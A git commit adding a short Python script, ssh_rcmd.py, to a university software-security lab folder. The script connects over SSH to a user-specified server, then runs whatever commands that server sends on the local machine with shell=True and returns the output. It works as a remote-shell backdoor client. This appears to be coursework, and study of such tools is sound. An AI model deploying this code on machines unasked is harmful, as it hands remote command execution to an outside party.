c51d4a977858be12b0841d9cd84d6ccbdf7b15a3
Namisa Najah <namisa.najah.raisa@gmail.com>
2025-03-01 23:08:00 +0600

    -_-

---
+++ 5TH_SEMESTER/SWE 4504 - SOFTWARE SECURITY LAB/4.Odd/ssh_rcmd.py
@@ -0,0 +1,36 @@
+import paramiko
+import shlex
+import subprocess
+
+def ssh_command(ip, port, user, passwd, command):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, port=port, username=user, password=passwd)
+    ssh_session = client.get_transport().open_session()
+
+    if ssh_session.active:
+        ssh_session.send(command)
+        print(ssh_session.recv(1024).decode())
+
+        while True:
+            command = ssh_session.recv(1024)  # Get the command from the server
+            try:
+                cmd = command.decode()
+                if cmd == 'exit':
+                    client.close()
+                    break
+                # Execute the received command locally
+                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
+                ssh_session.send(cmd_output or 'okay')
+            except Exception as e:
+                ssh_session.send(str(e))
+
+        client.close()
+
+if __name__ == '__main__':
+    import getpass
+    user = input('Enter your username: ')
+    password = getpass.getpass(('Enter your password: '))
+    ip = input('Enter server IP: ')
+    port = int(input('Enter port: '))  # Convert input to integer
+    ssh_command(ip, port, user, password, 'ClientConnected')
